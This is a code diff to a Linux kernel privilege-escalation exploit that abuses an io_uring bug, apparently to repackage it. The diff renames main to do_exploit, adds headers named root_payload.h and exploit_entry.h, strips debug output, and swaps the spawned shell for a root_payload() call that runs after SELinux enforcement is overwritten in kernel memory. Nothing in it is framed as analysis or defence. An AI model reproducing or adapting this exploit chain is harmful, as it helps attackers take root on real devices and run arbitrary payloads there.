@@ -21,6 +21,11 @@
 #include <sys/ioctl.h>
 #include <sys/wait.h>
 
+void do_exploit();
+#define EXPLOIT_MAIN do_exploit();
+#include <root_payload.h>
+#include <exploit_entry.h>
+
 typedef uint64_t u64;
 typedef int64_t i64;
 typedef uint32_t u32;
@@ -639,9 +644,6 @@ void setup_bug() {
 
 void trigger_bug() {
   io_uring_enter_poll(&context.io_uring, 2);
-  struct io_uring_cqe *cqes = io_uring_get_cqe(&context.io_uring);
-  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[0].res, cqes[0].user_data);
-  printf("dummy completion:\nret value: %d\nuser cookie: %lx\n", cqes[1].res, cqes[1].user_data);
   SYSCHK(write(context.pipe_to_thread[1], context.buf, 1));
   pthread_join(context.trigger_thread, NULL);
 }
@@ -1111,19 +1113,18 @@ void exploit() {
   write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
 #endif
 
-  system(SHELL);
+  // system(SHELL);
+  root_payload();
 
   while (1) {
     sleep(1000);
   }
 }
 
-int main() {
+void do_exploit() {
   puts("Starting exploit...");
 
   pin_to_cpu(0);
 
   exploit();
-
-  return 0;
 }
